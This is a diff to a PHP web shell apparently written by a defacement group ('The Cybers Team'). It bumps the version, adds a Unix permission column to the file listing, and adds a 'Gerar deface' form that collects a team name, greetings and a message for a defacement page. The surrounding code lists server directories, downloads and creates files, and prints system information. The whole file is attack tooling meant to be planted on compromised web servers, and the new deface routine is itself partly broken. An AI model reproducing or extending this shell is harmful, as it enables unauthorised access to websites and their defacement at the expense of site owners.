@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>The Cybers Shell [beta 0.7]</title>
+	<title>The Cybers Shell [beta 0.8]</title>
+	<meta charset="utf-8">
 
 	<style>
 		table{
@@ -39,7 +40,7 @@
 	</style>
 </head>
 <body>
-<small>[Beta 0.7] www.fb.com/TheCybersTeam</small>
+<small>[Beta 0.8] www.fb.com/TheCybersTeam</small>
 <br />
 <small><?php echo php_uname();?></small>
 <div class="logo"></div>
@@ -49,7 +50,7 @@
 
 /*
 	By: The Cybers Team
-	Versão: Beta 0.7
+	Versão: Beta 0.8
 	[ok] listar
 	[no] visualizar
 	[ok] download
@@ -62,6 +63,7 @@
 	[ok] criar
 	[no] hint bar
 	[ok] novo arquivo
+	[ok] permissoes
 */
 	// Configuração ==================================================
 	if(!$diretorio = $_GET['ls']){
@@ -70,6 +72,27 @@
 
 	// Funções =======================================================
 
+	function permissao($arquivo){
+		$perms = fileperms($arquivo);
+		if(($perms&0xC000)==0xC000)$info='s';
+		elseif(($perms&0xA000)==0xA000)$info='l';
+		elseif(($perms&0x8000)==0x8000)$info='-';
+		elseif(($perms&0x6000)==0x6000)$info='b';
+		elseif(($perms&0x4000)==0x4000)$info='d';
+		elseif(($perms&0x2000)==0x2000)$info='c';
+		elseif(($perms&0x1000)==0x1000)$info='p';
+		else $info='u';
+		$info.=($perms&0x0100)?'r':'-';
+		$info.=($perms&0x0080)?'w':'-';
+		$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
+		$info.=($perms&0x0020)?'r':'-';
+		$info.=($perms&0x0010)?'w':'-';
+		$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
+		$info.=($perms&0x0004)?'r':'-';
+		$info.=($perms&0x0002)?'w':'-';
+		$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
+		return $info;
+	}
 	function anterior($dir){
 		$dir = explode("/",$dir);
 		unset($dir[count($dir)-1]);
@@ -85,11 +108,16 @@
 				<input type='hidden' name='novo' value='$dir'/>
 				<input type=submit value='Novo arquivo'></input>
 			</form>
+			<form action='shell.php' method='GET'>
+				<input type='hidden' name='deface' value='$dir'/>
+				<input type=submit value='Gerar deface'></input>
+			</form>
 		";
 		echo "
 			<table>
 				<tr>
 					<th>Arquivo</th>
+					<th>Permissão</th>
 					<th>Tamanho</th>
 					<th>Abrir</th>
 					<th>Download</th>
@@ -109,11 +137,13 @@
 				echo "<td></td>";
 				echo "<td></td>";
 				echo "<td></td>";
+				echo "<td></td>";
 				echo "</tr>";	
 			}
 			if(!is_file($file) and $nome != ".." and $nome != "."){
 				echo "<tr>";
 				echo "<td><a href=?ls=$file>$nome</a></td>";
+				echo "<td>".permissao("$dir/$nome")."</td>";
 				echo "<td></td>";
 				echo "<td></td>";
 				echo "<td></td>";
@@ -125,6 +155,7 @@
 			if($nome != "." && $nome !=".." && is_file($file)){
 				echo "<tr>";	
 				echo "<td>".$nome."</td>";
+				echo "<td>".permissao("$dir/$nome")."</td>";
 				echo "<td>".filesize($file)." bytes</td>";
 				echo "<td><a href='#'>Visualizar</a></td>";
 				echo "<td><a href='?download=$file'>Download</a></td>";
@@ -192,6 +223,25 @@
 		echo "</textarea>";
 		echo "<br />";
 		echo "<input type=submit value=criar>";
+		echo "</form>";
+		exit();
+	}
+
+	function deface($diretorio){
+		echo "<form action=shell.php method=post>";
+		$arq = file($editar);
+		echo "<label>Nome da team:</label><br/>";
+		echo "<input type='text' name='nome'/><br/>";
+
+		echo "<label>Greatz:</label><br/>";
+		echo "<input type='text' greatz='nome'/><br/>";
+
+		echo "<input type='hidden' diretorio='$diretorio'/>";
+		echo "<label>Mensagem:</label><br/>";
+		echo "<textarea name=mensagem cols=100 rows=10>";
+		echo "</textarea>";
+		echo "<br />";
+		echo "<input type=submit value=gerar deface>";
 		echo "</form>";
 		exit();
 	}
@@ -288,6 +338,10 @@
 
 	if($novo = $_GET['novo']){
 		criar($novo);
+	}
+
+	if($deface = $_GET['deface']){
+		deface($deface);
 	}
 
 	// Shell =======================================================
